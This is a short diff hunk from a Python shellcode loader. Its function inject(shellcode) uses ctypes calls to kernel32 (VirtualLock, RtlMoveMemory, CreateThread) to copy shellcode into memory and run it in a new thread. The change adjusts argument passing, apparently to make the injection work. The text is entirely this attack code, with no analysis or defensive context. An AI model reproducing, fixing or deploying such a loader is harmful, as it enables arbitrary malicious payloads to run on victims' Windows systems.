@@ -44,9 +44,9 @@ def inject(shellcode):
     ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                        ctypes.c_int(len(shellcode)))
     buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
+    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr).value,
                                          buf,
-                                         ctypes.c_int(len(shellcode)))
+                                         ctypes.c_int(len(shellcode)).value)
     ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                              ctypes.c_int(0),
                                              ctypes.c_int(ptr),
